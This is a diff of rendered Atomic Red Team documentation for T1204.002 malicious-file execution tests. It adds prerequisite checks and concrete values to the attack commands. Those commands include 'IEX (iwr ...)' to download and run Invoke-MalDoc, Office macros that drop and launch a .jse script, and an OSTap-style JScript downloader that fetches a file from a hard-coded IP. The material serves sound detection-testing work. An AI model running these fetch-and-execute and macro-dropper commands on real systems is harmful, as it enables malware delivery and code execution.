@@ -384,6 +384,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-test-requires-ms-office-to-be-installed-and-have-been-run-previously-run-getprereqs-to-run-msword-and-build-dependant-registry-keys">
+         Description: Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -419,6 +447,34 @@
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id1">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id2">
+         Description: Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id3">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id4">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id5">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -435,7 +491,35 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id2">
+      <a class="reference internal nav-link" href="#id6">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id7">
+         Description: Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id8">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id9">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id10">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -486,11 +570,38 @@ Execution is handled by <a class="reference external" href="https://github.com/r
 References:
 https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-test-requires-ms-office-to-be-installed-and-have-been-run-previously-run-getprereqs-to-run-msword-and-build-dependant-registry-keys">
+<h5>Description: Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys<a class="headerlink" href="#description-test-requires-ms-office-to-be-installed-and-have-been-run-previously-run-getprereqs-to-run-msword-and-build-dependant-registry-keys" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>If (Test-Path HKCU:SOFTWARE\Microsoft\Office\16.0) { exit 0 } else { exit 1 }
+
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$msword</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">word</span><span class="p">.</span><span class="n">application</span>
+<span class="nb">Stop-Process</span> <span class="n">-Name</span> <span class="n">WINWORD</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1204</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s2">&quot;https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1&quot;</span><span class="p">)</span>
-<span class="nv">$macrocode</span> <span class="p">=</span> <span class="s2">&quot;   Open </span><span class="se">`&quot;</span><span class="s2">#{jse_path}</span><span class="se">`&quot;</span><span class="s2"> For Output As #1</span><span class="se">`n</span><span class="s2">   Write #1, </span><span class="se">`&quot;</span><span class="s2">WScript.Quit</span><span class="se">`&quot;`n</span><span class="s2">   Close #1</span><span class="se">`n</span><span class="s2">   Shell</span><span class="se">`$</span><span class="s2"> </span><span class="se">`&quot;</span><span class="s2">cscript.exe #{jse_path}</span><span class="se">`&quot;`n</span><span class="s2">&quot;</span>
-<span class="nb">Invoke-MalDoc</span> <span class="nv">$macrocode</span> <span class="s2">&quot;#{ms_office_version}&quot;</span> <span class="s2">&quot;#{ms_product}&quot;</span>
+<span class="nv">$macrocode</span> <span class="p">=</span> <span class="s2">&quot;   Open </span><span class="se">`&quot;</span><span class="s2">C:\Users\Public\art.jse</span><span class="se">`&quot;</span><span class="s2"> For Output As #1</span><span class="se">`n</span><span class="s2">   Write #1, </span><span class="se">`&quot;</span><span class="s2">WScript.Quit</span><span class="se">`&quot;`n</span><span class="s2">   Close #1</span><span class="se">`n</span><span class="s2">   Shell</span><span class="se">`$</span><span class="s2"> </span><span class="se">`&quot;</span><span class="s2">cscript.exe C:\Users\Public\art.jse</span><span class="se">`&quot;`n</span><span class="s2">&quot;</span>
+<span class="nb">Invoke-MalDoc</span> <span class="nv">$macrocode</span> <span class="s2">&quot;16.0&quot;</span> <span class="s2">&quot;Word&quot;</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -508,8 +619,8 @@ https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealt
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>echo var url = &quot;#{file_url}&quot;, fso = WScript.CreateObject(&#39;Scripting.FileSystemObject&#39;), request, stream; request = WScript.CreateObject(&#39;MSXML2.ServerXMLHTTP&#39;); request.open(&#39;GET&#39;, url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject(&#39;ADODB.Stream&#39;); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); &gt; #{script_file}
-cscript //E:Jscript #{script_file}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>echo var url = &quot;https://128.30.52.100/TR/PNG/iso_8859-1.txt&quot;, fso = WScript.CreateObject(&#39;Scripting.FileSystemObject&#39;), request, stream; request = WScript.CreateObject(&#39;MSXML2.ServerXMLHTTP&#39;); request.open(&#39;GET&#39;, url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject(&#39;ADODB.Stream&#39;); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); &gt; %TEMP%\OSTapGet.js
+cscript //E:Jscript %TEMP%\OSTapGet.js
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -527,10 +638,37 @@ cscript //E:Jscript #{script_file}
 Execution is handled by <a class="reference external" href="https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1">Invoke-MalDoc</a> to load and execute VBA code into Excel or Word documents.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id1">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id2">
+<h5>Description: Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id3">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>If (Test-Path HKCU:SOFTWARE\Microsoft\Office\16.0) { exit 0 } else { exit 1 }
+
+</pre></div>
+</div>
+</div>
+<div class="section" id="id4">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$msword</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">word</span><span class="p">.</span><span class="n">application</span>
+<span class="nb">Stop-Process</span> <span class="n">-Name</span> <span class="n">WINWORD</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1204</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id5">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s2">&quot;https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1&quot;</span><span class="p">)</span>
 <span class="nv">$macrocode</span> <span class="p">=</span> <span class="s2">&quot;  a = Shell(</span><span class="se">`&quot;</span><span class="s2">cmd.exe /c choice /C Y /N /D Y /T 3</span><span class="se">`&quot;</span><span class="s2">, vbNormalFocus)&quot;</span>
-<span class="nb">Invoke-MalDoc</span> <span class="nv">$macrocode</span> <span class="s2">&quot;#{ms_office_version}&quot;</span> <span class="s2">&quot;#{ms_product}&quot;</span>
+<span class="nb">Invoke-MalDoc</span> <span class="nv">$macrocode</span> <span class="s2">&quot;16.0&quot;</span> <span class="s2">&quot;Word&quot;</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -547,11 +685,38 @@ Execution is handled by <a class="reference external" href="https://github.com/r
 <p>Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript</p>
 <p>Execution is handled by <a class="reference external" href="https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1">Invoke-MalDoc</a> to load and execute VBA code into Excel or Word documents.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
-<div class="section" id="id2">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id6">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id7">
+<h5>Description: Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id8">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>If (Test-Path HKCU:SOFTWARE\Microsoft\Office\16.0) { exit 0 } else { exit 1 }
+
+</pre></div>
+</div>
+</div>
+<div class="section" id="id9">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$msword</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">word</span><span class="p">.</span><span class="n">application</span>
+<span class="nb">Stop-Process</span> <span class="n">-Name</span> <span class="n">WINWORD</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1204</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id10">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s2">&quot;https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1&quot;</span><span class="p">)</span>
-<span class="nv">$macrocode</span> <span class="p">=</span> <span class="s2">&quot;   Open </span><span class="se">`&quot;</span><span class="s2">#{jse_path}</span><span class="se">`&quot;</span><span class="s2"> For Output As #1</span><span class="se">`n</span><span class="s2">   Write #1, </span><span class="se">`&quot;</span><span class="s2">WScript.Quit</span><span class="se">`&quot;`n</span><span class="s2">   Close #1</span><span class="se">`n</span><span class="s2">   a = Shell(</span><span class="se">`&quot;</span><span class="s2">cmd.exe /c wscript.exe //E:jscript #{jse_path}</span><span class="se">`&quot;</span><span class="s2">, vbNormalFocus)</span><span class="se">`n</span><span class="s2">&quot;</span>
-<span class="nb">Invoke-MalDoc</span> <span class="nv">$macrocode</span> <span class="s2">&quot;#{ms_office_version}&quot;</span> <span class="s2">&quot;#{ms_product}&quot;</span>
+<span class="nv">$macrocode</span> <span class="p">=</span> <span class="s2">&quot;   Open </span><span class="se">`&quot;</span><span class="s2">C:\Users\Public\art.jse</span><span class="se">`&quot;</span><span class="s2"> For Output As #1</span><span class="se">`n</span><span class="s2">   Write #1, </span><span class="se">`&quot;</span><span class="s2">WScript.Quit</span><span class="se">`&quot;`n</span><span class="s2">   Close #1</span><span class="se">`n</span><span class="s2">   a = Shell(</span><span class="se">`&quot;</span><span class="s2">cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse</span><span class="se">`&quot;</span><span class="s2">, vbNormalFocus)</span><span class="se">`n</span><span class="s2">&quot;</span>
+<span class="nb">Invoke-MalDoc</span> <span class="nv">$macrocode</span> <span class="s2">&quot;16.0&quot;</span> <span class="s2">&quot;Word&quot;</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
